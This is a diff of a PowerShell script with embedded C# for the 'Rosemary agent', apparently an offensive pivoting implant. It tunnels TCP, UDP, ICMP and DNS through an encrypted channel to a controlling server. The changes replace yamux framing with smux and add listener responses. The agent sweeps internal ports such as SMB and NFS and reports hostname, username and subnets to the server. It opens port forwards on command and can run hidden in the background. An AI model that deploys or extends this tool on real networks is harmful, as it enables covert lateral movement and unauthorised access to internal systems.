@@ -60,9 +60,8 @@ public class RosemaryStreamBuf {
 }
 
 public class RosemaryAgent {
-    const byte FrData = 0, FrWin = 1, FrPing = 2, FrGoAway = 3;
-    const ushort FSyn = 1, FAck = 2, FFin = 4, FRst = 8;
-    const uint InitWin = 262144;
+    const byte SmuxVer = 2;
+    const byte CmdSyn = 0, CmdFin = 1, CmdPsh = 2, CmdNop = 3, CmdUpd = 4;
 
     static readonly int[] SweepPorts = {
         80,443,8080,8443,8000,8888,445,139,2049,548,
@@ -179,7 +178,7 @@ public class RosemaryAgent {
 
     byte[] Enc(byte[] p) {
         var n = new byte[12];
-        using (var rng = new RNGCryptoServiceProvider()) { rng.GetBytes(n); }
+        using (var rng = RandomNumberGenerator.Create()) { rng.GetBytes(n); }
         var c = GcmCtr(_key, n, p);
         var t = GcmComputeTag(_key, n, c);
         var r = new byte[12 + p.Length + 16];
@@ -220,11 +219,10 @@ public class RosemaryAgent {
 
     // ── Framing ───────────────────────────────────────────────────────────────
 
-    byte[] Hdr(byte type, ushort flags, uint id, uint len) {
+    byte[] Hdr(byte cmd, uint id, ushort len) {
         return new byte[] {
-            0, type, (byte)(flags >> 8), (byte)flags,
-            (byte)(id >> 24), (byte)(id >> 16), (byte)(id >> 8), (byte)id,
-            (byte)(len >> 24), (byte)(len >> 16), (byte)(len >> 8), (byte)len
+            SmuxVer, cmd, (byte)len, (byte)(len >> 8),
+            (byte)id, (byte)(id >> 8), (byte)(id >> 16), (byte)(id >> 24)
         };
     }
 
@@ -354,7 +352,7 @@ public class RosemaryAgent {
 
     byte[] BuildDnsQuery(string domain, ushort qtype) {
         var ms = new MemoryStream();
-        var id = new byte[2]; using (var rng = new RNGCryptoServiceProvider()) { rng.GetBytes(id); }
+        var id = new byte[2]; using (var rng = RandomNumberGenerator.Create()) { rng.GetBytes(id); }
         ms.Write(id, 0, 2); ms.Write(new byte[] { 0x01, 0x00 }, 0, 2);
         ms.Write(new byte[] { 0x00, 0x01 }, 0, 2); ms.Write(new byte[6], 0, 6);
         foreach (var label in domain.TrimEnd('.').Split('.')) { ms.WriteByte((byte)label.Length); ms.Write(Encoding.ASCII.GetBytes(label), 0, label.Length); }
@@ -409,39 +407,46 @@ public class RosemaryAgent {
         msg[0] = (byte)(enc.Length >> 24); msg[1] = (byte)(enc.Length >> 16);
         msg[2] = (byte)(enc.Length >> 8); msg[3] = (byte)enc.Length;
         Buffer.BlockCopy(enc, 0, msg, 4, enc.Length);
+        if (msg.Length > 65535) throw new InvalidOperationException("message too large");
         uint sid = (uint)(Interlocked.Add(ref _sid, 2) - 2);
-        await write(Hdr(FrWin, FSyn, sid, InitWin));
-        var fr = new byte[12 + msg.Length];
-        Buffer.BlockCopy(Hdr(FrData, FFin, sid, (uint)msg.Length), 0, fr, 0, 12);
-        Buffer.BlockCopy(msg, 0, fr, 12, msg.Length);
+        await write(Hdr(CmdSyn, sid, 0));
+        var fr = new byte[8 + msg.Length];
+        Buffer.BlockCopy(Hdr(CmdPsh, sid, (ushort)msg.Length), 0, fr, 0, 8);
+        Buffer.BlockCopy(msg, 0, fr, 8, msg.Length);
         await write(fr);
+        await write(Hdr(CmdFin, sid, 0));
     }
 
-    async Task YamuxLoop(RmReadFunc readN, RmWriteFunc write) {
+    async Task SmuxLoop(RmReadFunc readN, RmWriteFunc write) {
         try {
             while (!_cts.IsCancellationRequested) {
-                var hdr = await readN(12);
-                byte ft = hdr[1];
-                ushort fl = (ushort)((hdr[2] << 8) | hdr[3]);
-                uint sid = ((uint)hdr[4] << 24) | ((uint)hdr[5] << 16) | ((uint)hdr[6] << 8) | hdr[7];
-                uint flen = ((uint)hdr[8] << 24) | ((uint)hdr[9] << 16) | ((uint)hdr[10] << 8) | hdr[11];
-                if (ft == FrData) {
+                var hdr = await readN(8);
+                if (hdr[0] != SmuxVer) throw new InvalidDataException("invalid smux version " + hdr[0]);
+                byte cmd = hdr[1];
+                ushort flen = (ushort)(hdr[2] | (hdr[3] << 8));
+                uint sid = (uint)(hdr[4] | (hdr[5] << 8) | (hdr[6] << 16) | (hdr[7] << 24));
+                if (cmd == CmdPsh) {
                     var data = flen > 0 ? await readN((int)flen) : new byte[0];
-                    bool fin = (fl & FFin) != 0 || (fl & FRst) != 0;
                     RosemaryStreamBuf sb;
-                    if (_streams.TryGetValue(sid, out sb)) { sb.Push(data, fin); if (fin) { RosemaryStreamBuf ig; _streams.TryRemove(sid, out ig); } }
-                } else if (ft == FrWin) {
-                    if ((fl & FSyn) != 0 && (fl & FAck) == 0) {
+                    if (_streams.TryGetValue(sid, out sb)) sb.Push(data, false);
+                } else if (cmd == CmdSyn) {
+                    if (!_streams.ContainsKey(sid)) {
                         var sb = new RosemaryStreamBuf(sid);
                         _streams[sid] = sb; _incoming.TryAdd(sb);
-                        await write(Hdr(FrWin, FAck, sid, InitWin));
                     }
-                } else if (ft == FrPing && (fl & FAck) == 0) {
-                    await write(Hdr(FrPing, FAck, 0, flen));
-                } else if (ft == FrGoAway) { Log("[rm] server sent go-away, session closing"); break; }
+                } else if (cmd == CmdFin) {
+                    RosemaryStreamBuf sb;
+                    if (_streams.TryGetValue(sid, out sb)) { sb.Push(new byte[0], true); RosemaryStreamBuf ig; _streams.TryRemove(sid, out ig); }
+                } else if (cmd == CmdNop) {
+                    if (flen > 0) await readN((int)flen);
+                } else if (cmd == CmdUpd) {
+                    if (flen > 0) await readN((int)flen);
+                } else {
+                    throw new InvalidDataException("invalid smux command " + cmd);
+                }
             }
         } catch (Exception ex) {
-            if (!_cts.IsCancellationRequested) Log("[rm] yamux read error: " + ex.GetType().Name + ": " + ex.Message);
+            if (!_cts.IsCancellationRequested) Log("[rm] smux read error: " + ex.GetType().Name + ": " + ex.Message);
         }
         _cts.Cancel();
         _incoming.CompleteAdding();
@@ -648,44 +653,57 @@ public class RosemaryAgent {
         await SendMsg(write, "dns_response", "{\"request_id\":" + reqId + ",\"answers\":[" + string.Join(",", answers) + "],\"rcode\":" + rcode + "}", _agentId);
     }
 
-    Task HandleStartListener(string p) {
+    async Task SendStartListenerResp(RmWriteFunc write, string lid, bool success, string err) {
+        string e = success || string.IsNullOrEmpty(err) ? "" : ",\"error\":\"" + JE(err) + "\"";
+        await SendMsg(write, "start-agent-listener-response", "{\"listener_id\":\"" + JE(lid) + "\",\"success\":" + (success ? "true" : "false") + e + "}", _agentId);
+    }
+
+    async Task HandleStartListener(RmWriteFunc write, string p) {
         string lid = JStr(p, "listener_id"); int lport = JInt(p, "agent_listen_port");
         string dhost = JStr(p, "destination_host"); int dport = JInt(p, "destination_port"); string proto = JStr(p, "protocol", "tcp");
         var lcts = new CancellationTokenSource(); _lcts[lid] = lcts;
-        if (proto == "udp") {
-            var pc = new UdpClient(lport); _ulns[lid] = pc;
-            Task.Run(async () => {
-                var sessions = new ConcurrentDictionary<string, UdpClient>();
-                try {
-                    while (!lcts.Token.IsCancellationRequested) {
-                        var r = await pc.ReceiveAsync(); string k = r.RemoteEndPoint.ToString();
-                        UdpClient out2;
-                        if (!sessions.TryGetValue(k, out out2)) {
-                            out2 = new UdpClient(); out2.Connect(dhost, dport); sessions[k] = out2;
-                            var ep = r.RemoteEndPoint;
-                            Task.Run(async () => { try { while (true) { var rr = await out2.ReceiveAsync(); pc.Send(rr.Buffer, rr.Buffer.Length, ep); } } catch { } });
+        string startErr = null;
+        try {
+            if (proto == "udp") {
+                var pc = new UdpClient(lport); _ulns[lid] = pc;
+                await SendStartListenerResp(write, lid, true, "");
+                Task.Run(async () => {
+                    var sessions = new ConcurrentDictionary<string, UdpClient>();
+                    try {
+                        while (!lcts.Token.IsCancellationRequested) {
+                            var r = await pc.ReceiveAsync(); string k = r.RemoteEndPoint.ToString();
+                            UdpClient out2;
+                            if (!sessions.TryGetValue(k, out out2)) {
+                                out2 = new UdpClient(); out2.Connect(dhost, dport); sessions[k] = out2;
+                                var ep = r.RemoteEndPoint;
+                                Task.Run(async () => { try { while (true) { var rr = await out2.ReceiveAsync(); pc.Send(rr.Buffer, rr.Buffer.Length, ep); } } catch { } });
+                            }
+                            out2.Send(r.Buffer, r.Buffer.Length);
                         }
-                        out2.Send(r.Buffer, r.Buffer.Length);
-                    }
-                } catch { }
-                pc.Close(); UdpClient ig; _ulns.TryRemove(lid, out ig);
-            }, lcts.Token);
-        } else {
-            var ln = new TcpListener(IPAddress.Any, lport); ln.Start(); _lns[lid] = ln;
-            Task.Run(async () => {
-                try {
-                    while (!lcts.Token.IsCancellationRequested) {
-                        var client = await ln.AcceptTcpClientAsync();
-                        Task.Run(async () => {
-                            try { using (var dest = new TcpClient()) { await dest.ConnectAsync(dhost, dport); var t1 = client.GetStream().CopyToAsync(dest.GetStream()); var t2 = dest.GetStream().CopyToAsync(client.GetStream()); await Task.WhenAny(t1, t2); } } catch { }
-                            finally { if (client != null) client.Close(); }
-                        });
-                    }
-                } catch { }
-                ln.Stop(); TcpListener ig; _lns.TryRemove(lid, out ig);
-            }, lcts.Token);
+                    } catch { }
+                    pc.Close(); UdpClient ig; _ulns.TryRemove(lid, out ig);
+                }, lcts.Token);
+            } else {
+                var ln = new TcpListener(IPAddress.Any, lport); ln.Start(); _lns[lid] = ln;
+                await SendStartListenerResp(write, lid, true, "");
+                Task.Run(async () => {
+                    try {
+                        while (!lcts.Token.IsCancellationRequested) {
+                            var client = await ln.AcceptTcpClientAsync();
+                            Task.Run(async () => {
+                                try { using (var dest = new TcpClient()) { await dest.ConnectAsync(dhost, dport); var t1 = client.GetStream().CopyToAsync(dest.GetStream()); var t2 = dest.GetStream().CopyToAsync(client.GetStream()); await Task.WhenAny(t1, t2); } } catch { }
+                                finally { if (client != null) client.Close(); }
+                            });
+                        }
+                    } catch { }
+                    ln.Stop(); TcpListener ig; _lns.TryRemove(lid, out ig);
+                }, lcts.Token);
+            }
+        } catch (Exception ex) {
+            CancellationTokenSource igCts; _lcts.TryRemove(lid, out igCts);
+            startErr = ex.Message;
         }
-        return Task.CompletedTask;
+        if (startErr != null) await SendStartListenerResp(write, lid, false, startErr);
     }
 
     void HandleStopListener(string p) {
@@ -715,7 +733,7 @@ public class RosemaryAgent {
         Interlocked.Exchange(ref _sid, 1);
         string savedPrevId = _agentId.Length > 0 ? _agentId : _prevId;
         _agentId = "";
-        Task.Run(() => YamuxLoop(readN, write));
+        Task.Run(() => SmuxLoop(readN, write));
         var subnets = GetSubnets();
         string prevPart = savedPrevId.Length > 0 ? ",\"prev_id\":\"" + JE(savedPrevId) + "\"" : "";
         string regPay = "{\"subnets\":[" + string.Join(",", subnets.Select(s => "\"" + JE(s) + "\"")) + "],\"os\":\"windows\",\"hostname\":\"" + JE(GetHostname()) + "\",\"username\":\"" + JE(GetUser()) + "\",\"has_internet\":" + (HasInternet() ? "true" : "false") + prevPart + "}";
@@ -751,7 +769,7 @@ public class RosemaryAgent {
                         case "icmp-request": await HandleICMP(write, payload); break;
                         case "icmp_proxy": await HandleICMPProxy(write, payload); break;
                         case "dns_request": await HandleDNS(write, payload); break;
-                        case "start-agent-listener": await HandleStartListener(payload); break;
+                        case "start-agent-listener": await HandleStartListener(write, payload); break;
                         case "stop-agent-listener": HandleStopListener(payload); break;
                         case "agent_fwd_ack": HandleFwdAck(payload); break;
                         case "agent_fwd_data": HandleFwdData(payload); break;
@@ -876,8 +894,6 @@ public class RosemaryAgent {
 }
 "@ -Language CSharp
 
-function Invoke-Rosemary {
-    [CmdletBinding()]
 <#
 .SYNOPSIS
     Rosemary agent - connects to or listens for a Rosemary server.
@@ -912,6 +928,8 @@ function Invoke-Rosemary {
     # Bind mode - server connects to us
     Invoke-Rosemary -Key abcdefghijklmnopqrstuvwxyz012345= -Mode agent-bind -Listen 0.0.0.0:9001
 #>
+function Invoke-Rosemary {
+    [CmdletBinding()]
     param(
         [string]$Key = "",
         [string]$Server = "",
@@ -922,23 +940,25 @@ function Invoke-Rosemary {
         [switch]$Help
     )
     if ($Help -or $PSBoundParameters.Count -eq 0) {
-        Write-Host ''
-        Write-Host '  Usage: Invoke-Rosemary -Key KEY [options]'
-        Write-Host ''
-        Write-Host '  Parameters:'
-        Write-Host '    -Key        BASE64     Encryption key (required, must match server)'
-        Write-Host '    -Mode       MODE       agent (default) | agent-bind'
-        Write-Host '    -Server     HOST:PORT  Server address  required in agent mode'
-        Write-Host '    -Listen     HOST:PORT  Bind address for agent-bind mode (default: 0.0.0.0:9001)'
-        Write-Host '    -Background            Run silently in a hidden background window'
-        Write-Host '    -Verbose               Show connection and session diagnostic output'
-        Write-Host '    -Help                  Show this help'
-        Write-Host ''
-        Write-Host '  Examples:'
-        Write-Host '    Invoke-Rosemary -Mode agent -Server 192.168.1.10:1024 -Key YOUR_KEY'
-        Write-Host '    Invoke-Rosemary -Mode agent-bind -Listen 0.0.0.0:9001 -Key YOUR_KEY'
-        Write-Host '    Invoke-Rosemary -Mode agent -Server 192.168.1.10:1024 -Key YOUR_KEY -Background'
-        Write-Host ''
+        @'
+
+  Usage: Invoke-Rosemary -Key KEY [options]
+
+  Parameters:
+    -Key        BASE64     Encryption key (required, must match server)
+    -Mode       MODE       agent (default) | agent-bind
+    -Server     HOST:PORT  Server address required in agent mode
+    -Listen     HOST:PORT  Bind address for agent-bind mode (default: 0.0.0.0:9001)
+    -Background            Run silently in a hidden background window
+    -Verbose               Show connection and session diagnostic output
+    -Help                  Show this help
+
+  Examples:
+    Invoke-Rosemary -Mode agent -Server 192.168.1.10:1024 -Key YOUR_KEY
+    Invoke-Rosemary -Mode agent-bind -Listen 0.0.0.0:9001 -Key YOUR_KEY
+    Invoke-Rosemary -Mode agent -Server 192.168.1.10:1024 -Key YOUR_KEY -Background
+
+'@
         return
     }
     if (-not $Key) { Write-Error "Key is required. Run Invoke-Rosemary -Help for usage."; return }
